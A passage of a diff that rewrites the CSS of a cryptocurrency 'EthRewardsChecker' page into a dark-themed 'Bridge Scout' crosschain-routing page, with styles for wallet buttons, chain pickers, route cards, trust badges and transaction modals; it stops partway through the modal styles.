@@ -1,1662 +1,1979 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EthRewardsChecker - Enhanced</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>Bridge Scout — Smart Crosschain Routing</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         :root {
-            --bg-primary: #ffffff;
-            --bg-secondary: #f7f7f7;
-            --text-primary: #222222;
-            --text-secondary: #6c6c6c;
-            --accent: #627eea;
-            --accent-hover: #454a75;
-            --success: #10b981;
-            --error: #ef4444;
-            --border: #e2e2e2;
-            --shadow: rgba(0,0,0,0.06);
+            --bg: #0a0a0a;
+            --bg-secondary: #1a1a1a;
+            --surface: #141414;
+            --border: #2a2a2a;
+            --text-primary: #e5e5e5;
+            --text-secondary: #a3a3a3;
+            --text-muted: #737373;
+            --accent: #a78bfa;
+            --accent-hover: #8b5cf6;
+            --success: #86efac;
+            --warning: #fde68a;
+            --info: #bae6fd;
         }
-        
-        [data-theme="dark"] {
-            --bg-primary: #1a1a1a;
-            --bg-secondary: #2a2a2a;
-            --text-primary: #ffffff;
-            --text-secondary: #a0a0a0;
-            --border: #3a3a3a;
-            --shadow: rgba(0,0,0,0.3);
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        
+
         body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg-primary);
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
             color: var(--text-primary);
             line-height: 1.6;
-            min-height: 100vh;
-            position: relative;
             overflow-x: hidden;
-            transition: background 0.3s, color 0.3s;
+            text-transform: uppercase;
         }
-        
-        /* Background animations */
-        .eth-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            overflow: hidden;
-            pointer-events: none;
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 0 20px;
         }
-        
-        .eth-shape {
-            position: absolute;
-            opacity: 0.03;
-            animation: float 20s infinite ease-in-out;
+
+        /* Hero */
+        .hero {
+            padding: 60px 0 12px;
+            text-align: center;
         }
-        
-        .eth-shape:nth-child(1) {
-            width: 300px;
-            height: 300px;
-            background: linear-gradient(135deg, var(--accent), var(--accent-hover));
-            border-radius: 50%;
-            top: 10%;
-            left: -150px;
-        }
-        
-        .eth-shape:nth-child(2) {
-            width: 200px;
-            height: 200px;
-            background: linear-gradient(135deg, var(--accent-hover), var(--accent));
-            border-radius: 50%;
-            top: 60%;
-            right: -100px;
-            animation-delay: 7s;
-        }
-        
-        .eth-logo {
-            position: absolute;
-            opacity: 0.04;
-            animation: floatRotate 25s infinite ease-in-out;
-        }
-        
-        .eth-logo svg { width: 100%; height: 100%; fill: var(--accent); }
-        .eth-logo:nth-child(3) { width: 120px; height: 120px; top: 15%; right: 10%; }
-        .eth-logo:nth-child(4) { width: 80px; height: 80px; top: 70%; left: 15%; animation-delay: 5s; }
-        .eth-logo:nth-child(5) { width: 100px; height: 100px; top: 40%; right: 20%; animation-delay: 10s; }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-30px); }
-        }
-        
-        @keyframes floatRotate {
-            0% { transform: translateY(0) rotate(0deg); opacity: 0.04; }
-            25% { transform: translateY(-40px) rotate(90deg); opacity: 0.06; }
-            50% { transform: translateY(-20px) rotate(180deg); opacity: 0.03; }
-            75% { transform: translateY(30px) rotate(270deg); opacity: 0.05; }
-            100% { transform: translateY(0) rotate(360deg); opacity: 0.04; }
-        }
-        
-        /* Toast notifications */
-        .toast-container {
-            position: fixed;
-            top: 24px;
-            right: 24px;
-            z-index: 10001;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        
-        .toast {
-            background: white;
-            padding: 16px 20px;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            min-width: 300px;
-            animation: slideIn 0.3s ease-out;
-            border-left: 4px solid var(--accent);
-        }
-        
-        [data-theme="dark"] .toast {
-            background: var(--bg-secondary);
+
+        .hero h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
             color: var(--text-primary);
         }
-        
-        .toast.success { border-left-color: var(--success); }
-        .toast.error { border-left-color: var(--error); }
-        
-        .toast-icon { font-size: 20px; }
-        .toast-message { flex: 1; font-size: 14px; font-weight: 500; }
-        
-        @keyframes slideIn {
-            from { transform: translateX(400px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+
+        .hero p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
         }
-        
-        /* Cookie banner */
-        .cookie-banner {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: var(--text-primary);
-            color: var(--bg-primary);
-            padding: 20px;
-            z-index: 10000;
-            box-shadow: 0 -4px 12px var(--shadow);
-            transform: translateY(0);
-            transition: transform 0.3s ease-out;
-        }
-        
-        .cookie-banner.hide {
-            transform: translateY(100%);
-        }
-        
-        .cookie-banner.hidden { 
-            display: none; 
-        }
-        
-        .cookie-content {
-            max-width: 1200px;
-            margin: 0 auto;
+
+        .hero-badges {
             display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 24px;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
             flex-wrap: wrap;
         }
-        
-        .cookie-text { flex: 1; font-size: 14px; }
-        .cookie-buttons { display: flex; gap: 12px; }
-        
-        .cookie-btn {
-            padding: 10px 24px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        
-        .cookie-btn.accept { background: var(--accent); color: white; border: none; }
-        .cookie-btn.accept:hover { background: var(--accent-hover); }
-        .cookie-btn.decline { background: transparent; color: var(--bg-primary); border: 1px solid rgba(255,255,255,0.3); }
-        
-        /* Header controls */
-        .header-controls {
-            position: fixed;
-            top: 24px;
-            right: 24px;
-            z-index: 100;
-            display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-        
-        .theme-toggle {
-            width: 44px;
-            height: 44px;
-            background: var(--bg-primary);
+
+        .badge {
+            background: var(--surface);
             border: 1px solid var(--border);
-            border-radius: 8px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            transition: all 0.2s;
-            box-shadow: 0 2px 8px var(--shadow);
-        }
-        
-        .theme-toggle:hover {
-            transform: scale(1.05);
-            box-shadow: 0 4px 12px var(--shadow);
-        }
-        
-        .language-selector select {
-            padding: 10px 14px;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            font-size: 14px;
-            cursor: pointer;
-            box-shadow: 0 2px 8px var(--shadow);
-            transition: all 0.2s;
-        }
-        
-        .language-selector select:hover {
-            box-shadow: 0 4px 12px var(--shadow);
-        }
-        
-        /* Hero section */
-        .hero {
-            max-width: 1200px;
-            margin: 120px auto 80px;
-            padding: 0 24px;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .hero-logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 24px;
-            animation: pulse 3s ease-in-out infinite;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        
-        .hero-logo:hover {
-            transform: scale(1.1);
-        }
-        
-        .hero-logo svg {
-            width: 100%;
-            height: 100%;
-            filter: drop-shadow(0 4px 12px rgba(98, 126, 234, 0.3));
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        .hero h1 {
-            font-size: 56px;
-            font-weight: 800;
-            margin-bottom: 16px;
-            color: var(--accent);
-            background: linear-gradient(135deg, var(--accent), var(--accent-hover));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        
-        .hero p {
-            font-size: 20px;
+            padding: 6px 12px;
+            font-size: 10px;
             color: var(--text-secondary);
-            max-width: 700px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .badge-icon {
+            width: 12px;
+            height: 12px;
+            background: var(--success);
+            display: inline-block;
+        }
+
+        .hero-cta {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        /* Trust Section */
+        .trust-section {
+            padding: 16px 0 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .trust-content {
+            max-width: 600px;
             margin: 0 auto;
+            text-align: center;
         }
-        
-        /* Main container */
-        .container {
-            max-width: 640px;
-            margin: 0 auto 80px;
-            padding: 0 24px;
-            position: relative;
-            z-index: 1;
+
+        .trust-title {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+            letter-spacing: 1px;
         }
-        
-        .card {
-            background: var(--bg-primary);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 40px;
-            box-shadow: 0 4px 16px var(--shadow);
-            transition: all 0.3s;
-        }
-        
-        /* Form elements */
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        .input-wrapper {
-            position: relative;
+
+        .bridge-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
             margin-bottom: 24px;
+            flex-wrap: wrap;
         }
-        
-        input {
-            width: 100%;
-            padding: 14px 44px 14px 16px;
-            background: var(--bg-secondary);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            font-size: 15px;
-            font-family: 'Inter', sans-serif;
-            color: var(--text-primary);
-            transition: all 0.2s;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: var(--accent);
-            background: var(--bg-primary);
-            box-shadow: 0 0 0 3px rgba(98,126,234,0.1);
-        }
-        
-        .copy-btn {
-            position: absolute;
-            right: 8px;
-            top: 50%;
-            transform: translateY(-50%);
+
+        .bridge-logo {
             width: 32px;
             height: 32px;
-            background: transparent;
+            object-fit: contain;
+            opacity: 0.7;
+            transition: opacity 0.2s;
+        }
+
+        .bridge-logo:hover {
+            opacity: 1;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+
+        .security-badge {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: 8px 14px;
+            font-size: 10px;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .security-icon {
+            width: 14px;
+            height: 14px;
+            background: var(--success);
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: white;
+            padding: 12px 28px;
             border: none;
-            border-radius: 6px;
             cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            transition: background 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--text-primary);
+            padding: 12px 28px;
+            border: 1px solid var(--border);
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 13px;
+            transition: all 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-secondary:hover {
+            border-color: var(--text-primary);
+        }
+
+        /* Bridge Card */
+        .bridge-section {
+            padding: 24px 0 30px;
+        }
+
+        .workflow-preview {
+            max-width: 600px;
+            margin: 0 auto 20px;
+            text-align: center;
+        }
+
+        .workflow-steps {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0;
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .workflow-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+            flex: 1;
+            max-width: 140px;
+        }
+
+        .workflow-step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            width: 100%;
+            height: 1px;
+            background: var(--border);
+        }
+
+        .step-dot {
+            width: 20px;
+            height: 20px;
+            background: var(--accent);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 16px;
-            transition: all 0.2s;
-            opacity: 0;
-        }
-        
-        .input-wrapper:hover .copy-btn {
-            opacity: 1;
-        }
-        
-        .copy-btn:hover {
-            background: var(--bg-secondary);
-        }
-        
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: var(--accent);
-            border: none;
-            border-radius: 10px;
+            font-weight: 700;
+            font-size: 10px;
             color: white;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-label {
+            font-size: 9px;
+            color: var(--text-secondary);
+            text-align: center;
+            line-height: 1.3;
+        }
+
+        .workflow-note {
+            font-size: 10px;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+        }
+
+        .bridge-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: 24px;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .bridge-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .bridge-header h2 {
             font-size: 16px;
             font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .status {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .btn-wallet {
+            background: var(--accent);
+            color: white;
+            padding: 8px 16px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 11px;
+            transition: background 0.2s;
+        }
+
+        .btn-wallet:hover {
+            background: var(--accent-hover);
+        }
+
+        .wallet-connected {
+            color: var(--success);
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-label {
+            font-size: 10px;
+            color: var(--text-muted);
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+            display: block;
+            font-weight: 600;
+        }
+
+        .chain-selector {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            padding: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+
+        .chain-selector:hover {
+            border-color: var(--accent);
+        }
+
+        .chain-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .chain-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .chain-details h4 {
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .chain-details p {
+            font-size: 10px;
+            color: var(--text-muted);
+        }
+
+        .amount-input {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            padding: 16px 12px;
+            margin-bottom: 16px;
+        }
+
+        .amount-input input {
+            background: transparent;
+            border: none;
+            color: var(--text-primary);
+            font-size: 28px;
+            font-weight: 600;
+            width: 100%;
+            outline: none;
+            text-align: center;
+        }
+
+        .amount-input input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .amount-label {
+            font-size: 10px;
+            color: var(--text-muted);
+            margin-top: 6px;
+            text-align: center;
+        }
+
+        .swap-icon {
+            width: 36px;
+            height: 36px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: -18px auto;
+            position: relative;
+            z-index: 10;
             cursor: pointer;
             transition: all 0.2s;
-            position: relative;
-            overflow: hidden;
         }
-        
-        .btn:hover:not(:disabled) {
-            background: var(--accent-hover);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 16px rgba(98,126,234,0.3);
+
+        .swap-icon:hover {
+            border-color: var(--accent);
+            transform: rotate(180deg);
         }
-        
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        .btn-loading {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* Skeleton loader */
-        .skeleton {
-            background: linear-gradient(90deg, var(--bg-secondary) 25%, var(--border) 50%, var(--bg-secondary) 75%);
-            background-size: 200% 100%;
-            animation: loading 1.5s infinite;
-            border-radius: 8px;
-        }
-        
-        @keyframes loading {
-            0% { background-position: 200% 0; }
-            100% { background-position: -200% 0; }
-        }
-        
-        /* Results */
-        .result {
-            margin-top: 32px;
-            padding: 24px;
-            border-radius: 12px;
-            border: 1px solid;
-            animation: fadeIn 0.3s ease-out;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .result.success {
-            background: rgba(16,185,129,0.05);
-            border-color: var(--success);
-        }
-        
-        [data-theme="dark"] .result.success {
-            background: rgba(16,185,129,0.1);
-        }
-        
-        .result.error {
-            background: rgba(239,68,68,0.05);
-            border-color: var(--error);
-        }
-        
-        [data-theme="dark"] .result.error {
-            background: rgba(239,68,68,0.1);
-        }
-        
-        .result-title {
-            font-weight: 700;
-            font-size: 18px;
+
+        /* Routes */
+        .route-comparison {
             margin-bottom: 12px;
         }
-        
-        .result.success .result-title { color: var(--success); }
-        .result.error .result-title { color: var(--error); }
-        
-        .vip-message {
-            color: var(--success);
-            font-weight: 600;
-            margin-bottom: 16px;
-            font-size: 15px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .stat-box {
-            padding: 20px;
-            background: var(--bg-secondary);
-            border-radius: 12px;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: var(--text-secondary);
-            text-transform: uppercase;
-            font-weight: 600;
-            margin-bottom: 8px;
-            letter-spacing: 0.5px;
-        }
-        
-        .stat-value {
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 4px;
-            color: var(--text-primary);
-        }
-        
-        .reward-box {
-            margin-top: 16px;
-            padding: 16px;
-            background: rgba(16,185,129,0.1);
-            border: 2px solid var(--success);
-            border-radius: 10px;
-        }
-        
-        /* History section */
-        .history-section {
-            margin-top: 32px;
-            padding-top: 32px;
-            border-top: 1px solid var(--border);
-        }
-        
-        .history-title {
-            font-size: 14px;
-            font-weight: 700;
-            text-transform: uppercase;
-            color: var(--text-secondary);
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .clear-history {
-            font-size: 12px;
-            color: var(--accent);
-            cursor: pointer;
-            text-transform: none;
-            font-weight: 600;
-        }
-        
-        .clear-history:hover {
-            text-decoration: underline;
-        }
-        
-        .history-item {
+
+        .scanning {
+            text-align: center;
             padding: 12px;
-            background: var(--bg-secondary);
-            border-radius: 8px;
-            margin-bottom: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            font-size: 10px;
+            color: var(--text-muted);
+        }
+
+        .scanning-bar {
+            height: 2px;
+            background: var(--bg);
+            margin-top: 6px;
+            overflow: hidden;
+        }
+
+        .scanning-progress {
+            height: 100%;
+            background: var(--accent);
+            animation: scan 1.5s ease-in-out infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .route {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            padding: 8px 10px;
+            margin-bottom: 4px;
             cursor: pointer;
             transition: all 0.2s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        
-        .history-item:hover {
-            background: var(--border);
-            transform: translateX(4px);
+
+        .route:hover {
+            border-color: var(--accent);
         }
-        
-        .history-address {
-            font-size: 13px;
-            font-family: monospace;
-            color: var(--text-primary);
+
+        .route.best {
+            border-color: var(--accent);
+            background: var(--surface);
         }
-        
-        .history-time {
-            font-size: 12px;
+
+        .route-info h4 {
+            font-size: 10px;
+            font-weight: 600;
+            margin-bottom: 3px;
+        }
+
+        .route-stats {
+            display: flex;
+            gap: 8px;
+            font-size: 8px;
+            color: var(--text-muted);
+        }
+
+        .route-badge {
+            background: var(--accent);
+            color: white;
+            padding: 2px 6px;
+            font-size: 8px;
+            font-weight: 600;
+        }
+
+        .route-transparency {
+            margin-top: 8px;
+            padding: 8px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            font-size: 8px;
+            color: var(--text-muted);
+            text-align: left;
+        }
+
+        .transparency-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 3px 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .transparency-item:last-child {
+            border-bottom: none;
+        }
+
+        .transparency-label {
+            color: var(--text-muted);
+        }
+
+        .transparency-value {
             color: var(--text-secondary);
+            font-weight: 600;
         }
-        
-        /* Footer */
-        .footer {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 40px 24px;
-            text-align: center;
-            color: var(--text-secondary);
-            font-size: 14px;
-            border-top: 1px solid var(--border);
-            position: relative;
-            z-index: 1;
-        }
-        
-        .footer a {
+
+        .transparency-link {
             color: var(--accent);
             text-decoration: none;
             font-weight: 600;
-            cursor: pointer;
+            transition: color 0.2s;
         }
-        
-        .footer a:hover { text-decoration: underline; }
-        
+
+        .transparency-link:hover {
+            color: var(--accent-hover);
+            text-decoration: underline;
+        }
+
+        .btn-bridge {
+            width: 100%;
+            background: var(--accent);
+            color: white;
+            padding: 14px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            transition: background 0.2s;
+        }
+
+        .btn-bridge:hover:not(:disabled) {
+            background: var(--accent-hover);
+        }
+
+        .btn-bridge:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Features */
+        .features {
+            padding: 30px 0;
+            text-align: center;
+        }
+
+        .features h2 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 32px;
+        }
+
+        .features-box {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: 32px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .features-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px 20px;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        .feature-icon {
+            font-size: 16px;
+        }
+
+        /* Stats */
+        .stats {
+            padding: 40px 0;
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 24px;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .stat h3 {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .stat p {
+            font-size: 10px;
+            color: var(--text-muted);
+            letter-spacing: 0.5px;
+        }
+
+        /* Footer */
+        footer {
+            padding: 60px 0 40px;
+            text-align: center;
+            border-top: 1px solid var(--border);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: var(--text-primary);
+        }
+
+        .footer-bottom {
+            color: var(--text-muted);
+            font-size: 12px;
+        }
+
         /* Modal */
+        /* Loading Modal */
+        .loading-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-modal.active {
+            display: flex;
+        }
+
+        .loading-content {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: 40px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .loading-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            border: 3px solid var(--border);
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text-primary);
+        }
+
+        .loading-subtitle {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+        }
+
+        .loading-progress {
+            width: 100%;
+            height: 4px;
+            background: var(--bg);
+            overflow: hidden;
+            margin-top: 20px;
+        }
+
+        .loading-progress-bar {
+            height: 100%;
+            background: var(--accent);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .loading-steps {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .loading-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .loading-step.active {
+            color: var(--accent);
+        }
+
+        .loading-step.complete {
+            color: var(--success);
+        }
+
+        .step-icon {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            flex-shrink: 0;
+        }
+
+        .loading-step.active .step-icon {
+            border-color: var(--accent);
+            background: var(--accent);
+            color: white;
+        }
+
+        .loading-step.complete .step-icon {
+            border-color: var(--success);
+            background: var(--success);
+            color: white;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .tx-hash {
+            background: var(--bg);
+            padding: 12px;
+            margin-top: 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-secondary);
+            word-break: break-all;
+        }
+
+        .btn-view-tx {
+            background: var(--accent);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 12px;
+            margin-top: 16px;
+            transition: background 0.2s;
+            width: 100%;
+        }
+
+        .btn-view-tx:hover {
+            background: var(--accent-hover);
+        }
+
+        /* Chain Selection Modal */
+        .chain-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .chain-modal.active {
+            display: flex;
+        }
+
+        .chain-modal-content {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            max-width: 400px;
+            width: 100%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .chain-modal-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .chain-modal-header h3 {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .chain-modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text-muted);
+            padding: 0;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .chain-modal-close:hover {
+            color: var(--text-primary);
+        }
+
+        .chain-list {
+            padding: 12px;
+        }
+
+        .chain-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+            border: 1px solid transparent;
+            margin-bottom: 4px;
+        }
+
+        .chain-option:hover {
+            background: var(--bg);
+            border-color: var(--accent);
+        }
+
+        .chain-option-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .chain-option-info h4 {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .chain-option-info p {
+            font-size: 10px;
+            color: var(--text-muted);
+        }
+
         .modal {
             display: none;
             position: fixed;
-            z-index: 9999;
-            left: 0;
             top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.75);
-            animation: fadeIn 0.2s;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
-        
+
         .modal.active {
             display: flex;
-            align-items: center;
-            justify-content: center;
         }
-        
+
         .modal-content {
-            background: var(--bg-primary);
-            border-radius: 16px;
-            width: 90%;
-            max-width: 900px;
-            max-height: 85vh;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            max-width: 600px;
+            width: 100%;
+            max-height: 80vh;
             overflow-y: auto;
-            padding: 48px;
             position: relative;
-            animation: slideUp 0.3s ease-out;
         }
-        
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+
+        .modal-header {
+            padding: 24px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        
-        .close-modal {
-            position: absolute;
-            top: 24px;
-            right: 24px;
-            font-size: 28px;
+
+        .modal-header h3 {
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
             cursor: pointer;
-            width: 40px;
-            height: 40px;
+            color: var(--text-muted);
+            padding: 0;
+            width: 32px;
+            height: 32px;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 8px;
-            transition: 0.2s;
+        }
+
+        .modal-close:hover {
             color: var(--text-primary);
         }
-        
-        .close-modal:hover {
-            background: var(--bg-secondary);
